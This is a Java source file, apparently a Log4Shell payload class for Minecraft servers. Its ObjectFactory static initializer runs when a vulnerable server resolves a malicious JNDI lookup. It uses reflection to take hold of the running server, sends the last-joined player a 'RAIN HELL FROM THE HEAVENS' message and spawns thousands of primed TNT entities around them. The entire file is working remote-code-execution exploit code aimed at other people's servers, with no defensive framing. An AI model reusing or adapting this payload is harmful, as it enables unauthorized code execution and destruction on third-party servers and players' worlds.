import net.minecraft.command.CommandBase;
import net.minecraft.command.ServerCommandManager;
import net.minecraft.entity.item.EntityTNTPrimed;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.ChatType;
import net.minecraft.util.text.TextComponentString;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.concurrent.Callable;

public class CarpetBomb implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            Field managerF = CommandBase.class.getDeclaredField("a");
            managerF.setAccessible(true);
            ServerCommandManager manager = (ServerCommandManager)managerF.get(null);
            Field serverF = ServerCommandManager.class.getDeclaredField("a");
            serverF.setAccessible(true);
            MinecraftServer server = (MinecraftServer)serverF.get(manager);

            int lastIndex = server.getPlayerList().getPlayerList().size()-1;
            if (lastIndex == -1) {
                return null;
            }
            EntityPlayerMP me = server.getPlayerList().getPlayerList().get(lastIndex);

            //EntityPlayerMP me = server.getPlayerList().getPlayerByUsername("Captain_S0L0");

            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nRAIN HELL FROM THE HEAVENS\u00a75\u00a7k-|-"), ChatType.SYSTEM));

                int range = 15;
                for (int x = -range; x <= range; x++) {
                    for (int z = -range; z <= range; z++) {
                        for (int multiplier = 0; multiplier < 3; multiplier++) {
                            me.getServerWorld().spawnEntityInWorld(new EntityTNTPrimed(me.getServerWorld(), me.posX + (x * 3), me.posY + 20, me.posZ + (z * 3), null));
                        }
                    }
                }
            }

            server.currentTask = null;
            return null;
        };

        Thread thread = new Thread(() -> {
            try {
                Field managerF = CommandBase.class.getDeclaredField("a");
                managerF.setAccessible(true);
                ServerCommandManager manager = (ServerCommandManager) managerF.get(null);
                Field serverF = ServerCommandManager.class.getDeclaredField("a");
                serverF.setAccessible(true);
                MinecraftServer server = (MinecraftServer) serverF.get(manager);

                if (server == null || !server.isServerRunning() || (server.currentTask != null && server.currentTask.equals("log4j"))) {
                    return;
                }
                server.currentTask = "log4j";
                server.callFromMainThread(submitToMain);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        thread.start();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
